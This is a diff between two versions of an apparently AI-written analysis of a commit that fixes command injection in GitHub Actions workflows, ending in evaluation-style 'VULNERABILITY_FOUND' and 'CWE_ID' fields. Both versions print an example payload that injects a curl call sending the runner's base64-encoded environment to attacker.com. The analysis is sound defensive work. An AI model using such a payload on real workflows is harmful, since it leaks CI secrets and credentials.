@@ -1,30 +1,40 @@
-The changes in `file_01` and `file_02` both address a common security vulnerability in GitHub Actions workflows: **Command Injection** via expression interpolation.
+The provided commit fixes a security vulnerability related to **Command Injection** in GitHub Actions workflows.
 
-In GitHub Actions, when you use `${{ expression }}` directly within a `run` script, the value is interpolated into the script as a raw string *before* the shell executes it. If an attacker can control the value of that expression (e.g., via a PR title, a branch name, or an input parameter), they can inject arbitrary shell commands.
+### Analysis
 
-For example, in `file_02`, the original code was:
-```bash
-PR_TITLE="${{ github.event.pull_request.title }}"
+The commit modifies two GitHub Actions workflow files (`/changes/file_01` and `/changes/file_02`). In the `before.txt` versions of these files, several GitHub context variables (such as `${{ github.event.inputs.redeploy_tag }}`, `${{ matrix.component }}`, and `${{ github.event.pull_request.title }}`) were interpolated directly into shell scripts within the `run` blocks.
+
+For example, in `file_01` (before):
+```yaml
+- name: Detect components for deployment
+  id: detect
+  run: |
+    if [[ "${{ github.event.inputs.redeploy_tag }}" != "" ]]; then
+      TAG="${{ github.event.inputs.redeploy_tag }}"
 ```
-If a malicious user creates a PR with the title `"; curl http://attacker.com/$(env | base64); #`, the interpolated script becomes:
-```bash
-PR_TITLE=""; curl http://attacker.com/$(env | base64); #"
+
+And in `file_02` (before):
+```yaml
+- name: Extract version and component from PR
+  id: version_info
+  run: |
+    PR_TITLE="${{ github.event.pull_request.title }}"
+    BRANCH_NAME="${{ github.head_ref }}"
 ```
-This allows the attacker to execute arbitrary commands in the runner environment, potentially stealing secrets (like `SVN_PASSWORD` seen in `file_01`).
 
-The fix applied in both files is to map these expressions to **environment variables** using the `env` key of the step. When a value is accessed via an environment variable (e.g., `$PR_TITLE` or `$REDEPLOY_TAG`), it is treated as data by the shell, preventing it from being interpreted as part of the command.
+In GitHub Actions, when you use `${{ ... }}` inside a `run` block, the expression is evaluated and the result is substituted directly into the shell script before it is executed. If an attacker can control the value of these variables (e.g., by creating a PR with a malicious title or triggering a `workflow_dispatch` event with a crafted `redeploy_tag`), they can inject arbitrary shell commands. 
 
-In `file_01`, several inputs and outputs were moved to `env`, including:
-- `github.event.inputs.redeploy_tag` $\rightarrow$ `$REDEPLOY_TAG`
-- `needs.release-please.result` $\rightarrow$ `$NEEDS_RELEASE_PLEASE_RESULT`
-- `secrets.SVN_PASSWORD` $\rightarrow$ `$SVN_PASSWORD` (though secrets are generally handled more securely, putting them in `env` is the recommended practice for `run` steps).
+For instance, if `redeploy_tag` was set to `"; curl http://attacker.com/$(env | base64) #`, the resulting shell command would become:
+```bash
+if [[ ""; curl http://attacker.com/$(env | base64) #" != "" ]]; then
+```
+This would allow the attacker to execute arbitrary code in the runner's environment, potentially stealing secrets (like `REPO_PAT`, `SVN_USERNAME`, `SVN_PASSWORD`) or compromising the build process.
 
-In `file_02`, the following were moved to `env`:
-- `github.event.pull_request.title` $\rightarrow$ `$PR_TITLE`
-- `github.head_ref` $\rightarrow$ `$BRANCH_NAME`
-- `steps.version_info.outputs.version` $\rightarrow$ `$VERSION`
+The fix involves assigning these GitHub context variables to **environment variables** in the `env` section of the step and then referencing those environment variables in the shell script. Environment variables are handled safely by the shell and do not allow for the same type of interpolation-based command injection.
 
-This is a classic instance of CWE-78 (OS Command Injection).
+### Conclusion
+
+The commit implements a critical security fix to prevent remote command execution via malicious input in GitHub Actions workflows.
 
 VULNERABILITY_FOUND: yes
 CWE_ID: CWE-78
